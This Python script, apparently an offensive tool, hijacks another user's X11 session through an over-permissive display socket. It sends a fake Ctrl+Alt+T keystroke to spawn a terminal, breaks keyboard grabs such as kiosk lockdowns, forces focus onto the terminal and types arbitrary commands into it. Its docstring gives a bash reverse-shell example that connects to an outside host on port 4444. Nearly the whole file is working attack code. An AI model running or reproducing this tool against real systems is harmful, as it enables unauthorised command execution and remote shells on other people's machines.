#!/usr/bin/env python3
"""
xtest_hijack.py

A small tool to abuse an over-permissive X11 display socket (e.g. a
world-writable /tmp/.X11-unix/X<N>) in order to:

  1. Synthesize a window-manager keybinding (default: Ctrl+Alt+T) via the
     XTEST extension, to spawn a terminal on someone else's active X
     session.
  2. Locate that terminal window, forcibly take keyboard focus for it
     (breaking any active keyboard grab, e.g. a kiosk-mode browser), and
     verify -- at the X protocol level -- that synthetic key events are
     actually reaching it.
  3. "Type" an arbitrary command into it, character by character, handling
     shifted characters correctly.

This requires:
  - `python-xlib` (pip install python-xlib)
  - Network/local access to the target's X11 socket, with DISPLAY (and,
    if required, XAUTHORITY) pointing at it.

Usage examples:
    export DISPLAY=:0
    python3 xtest_hijack.py --open-terminal
    python3 xtest_hijack.py --type "whoami"
    python3 xtest_hijack.py --window-class xterm --type "bash -c 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'"

Run with --open-terminal first, give the WM a second or two to spawn the
window, then run again with --type (or combine both with --open-terminal
--type "..." in a single invocation).
"""

import argparse
import sys
import time

from Xlib import X, display
from Xlib.ext import xtest
from Xlib.XK import string_to_keysym

# Characters that need an explicit keysym name instead of their literal
# character (mainly punctuation not handled cleanly by string_to_keysym on
# every layout).
CHAR_TO_KEYSYM_NAME = {
    " ": "space", "\t": "Tab", "\n": "Return",
    "!": "exclam", '"': "quotedbl", "#": "numbersign", "$": "dollar",
    "%": "percent", "&": "ampersand", "'": "apostrophe", "(": "parenleft",
    ")": "parenright", "*": "asterisk", "+": "plus", ",": "comma",
    "-": "minus", ".": "period", "/": "slash", ":": "colon",
    ";": "semicolon", "<": "less", "=": "equal", ">": "greater",
    "?": "question", "@": "at", "[": "bracketleft", "\\": "backslash",
    "]": "bracketright", "^": "asciicircum", "_": "underscore",
    "`": "grave", "{": "braceleft", "|": "bar", "}": "braceright",
    "~": "asciitilde",
}


class XTestHijacker:
    def __init__(self, display_name=None):
        self.d = display.Display(display_name)
        self.root = self.d.screen().root

    # ---- low-level key event helpers -----------------------------------

    def _key_event(self, keycode, press):
        if keycode == 0:
            return
        xtest.fake_input(self.d, X.KeyPress if press else X.KeyRelease, keycode)
        self.d.sync()

    def _tap_keysym(self, keysym):
        kc = self.d.keysym_to_keycode(keysym)
        self._key_event(kc, True)
        self._key_event(kc, False)

    def send_combo(self, *keysym_names):
        """Press and hold a list of keysym names together, then release
        in reverse order (e.g. send_combo('Control_L', 'Alt_L', 't'))."""
        keysyms = [string_to_keysym(name) for name in keysym_names]
        keycodes = [self.d.keysym_to_keycode(ks) for ks in keysyms]
        for kc in keycodes:
            self._key_event(kc, True)
        time.sleep(0.05)
        for kc in reversed(keycodes):
            self._key_event(kc, False)

    def get_keysym(self, ch):
        if ch in CHAR_TO_KEYSYM_NAME:
            return string_to_keysym(CHAR_TO_KEYSYM_NAME[ch])
        return string_to_keysym(ch)

    def send_char(self, ch):
        keysym = self.get_keysym(ch)
        if not keysym:
            print(f"[!] no keysym for char: {ch!r}", file=sys.stderr)
            return
        keycode = self.d.keysym_to_keycode(keysym)
        if keycode == 0:
            print(f"[!] no keycode for keysym of char: {ch!r}", file=sys.stderr)
            return

        base = self.d.keycode_to_keysym(keycode, 0)
        need_shift = base != keysym
        shift_kc = self.d.keysym_to_keycode(string_to_keysym("Shift_L"))

        if need_shift:
            self._key_event(shift_kc, True)
        self._key_event(keycode, True)
        self._key_event(keycode, False)
        if need_shift:
            self._key_event(shift_kc, False)

    def type_string(self, s, delay=0.03, press_enter=True):
        for ch in s:
            self.send_char(ch)
            time.sleep(delay)
        if press_enter:
            self._tap_keysym(string_to_keysym("Return"))

    # ---- window discovery / focus ---------------------------------------

    def get_client_list(self):
        atom = self.d.intern_atom("_NET_CLIENT_LIST")
        prop = self.root.get_full_property(atom, X.AnyPropertyType)
        return list(prop.value) if prop else []

    def window_has_class(self, win_id, class_substr):
        try:
            win = self.d.create_resource_object("window", win_id)
            cls = win.get_wm_class()
            return bool(cls and any(class_substr.lower() in c.lower() for c in cls))
        except Exception:
            return False

    def find_window_by_class(self, class_substr):
        matches = [w for w in self.get_client_list()
                   if self.window_has_class(w, class_substr)]
        return matches[-1] if matches else None

    def force_focus(self, win_id, verify=True):
        """Break any active keyboard grab, raise + focus the given window,
        and optionally verify (via our own KeyPress subscription) that
        synthetic events actually reach it."""
        try:
            self.d.ungrab_keyboard(X.CurrentTime)
            self.d.sync()
        except Exception as e:
            print(f"[!] ungrab_keyboard failed (continuing): {e}", file=sys.stderr)

        win = self.d.create_resource_object("window", win_id)

        if verify:
            win.change_attributes(event_mask=X.KeyPressMask | X.KeyReleaseMask)
            self.d.sync()

        win.raise_window()
        self.d.sync()
        win.set_input_focus(X.RevertToParent, X.CurrentTime)
        self.d.sync()

        if verify:
            test_ks = string_to_keysym("a")
            self._tap_keysym(test_ks)
            time.sleep(0.2)
            got_event = False
            for _ in range(self.d.pending_events()):
                ev = self.d.next_event()
                if ev.type in (X.KeyPress, X.KeyRelease):
                    got_event = True
            if not got_event:
                print("[!] Could not confirm key-event delivery to target "
                      "window; focus or grab issue likely.", file=sys.stderr)
            else:
                print("[+] Key-event delivery to target window confirmed.")

        return win


def main():
    parser = argparse.ArgumentParser(description=__doc__,
                                      formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--display", default=None,
                         help="X display to connect to (defaults to $DISPLAY).")
    parser.add_argument("--open-terminal", action="store_true",
                         help="Send Ctrl+Alt+T to spawn a terminal via the WM keybinding.")
    parser.add_argument("--window-class", default="xterm",
                         help="WM_CLASS substring to search for (default: xterm).")
    parser.add_argument("--type", dest="command", default=None,
                         help="Command to type into the focused terminal window.")
    parser.add_argument("--no-enter", action="store_true",
                         help="Don't press Return after typing.")
    parser.add_argument("--wait", type=float, default=2.0,
                         help="Seconds to wait after opening a terminal before continuing.")
    args = parser.parse_args()

    hij = XTestHijacker(args.display)

    if args.open_terminal:
        print("[*] Sending Ctrl+Alt+T...")
        hij.send_combo("Control_L", "Alt_L", "t")
        time.sleep(args.wait)

    if args.command is not None:
        win_id = hij.find_window_by_class(args.window_class)
        if win_id is None:
            print(f"[!] No window found matching class '{args.window_class}'. "
                  "Try --open-terminal first, or pass a different --window-class.",
                  file=sys.stderr)
            sys.exit(1)

        print(f"[*] Target window: {hex(win_id)}")
        hij.force_focus(win_id)
        time.sleep(0.5)

        print(f"[*] Typing: {args.command!r}")
        hij.type_string(args.command, press_enter=not args.no_enter)
        print("[*] Done.")


if __name__ == "__main__":
    main()
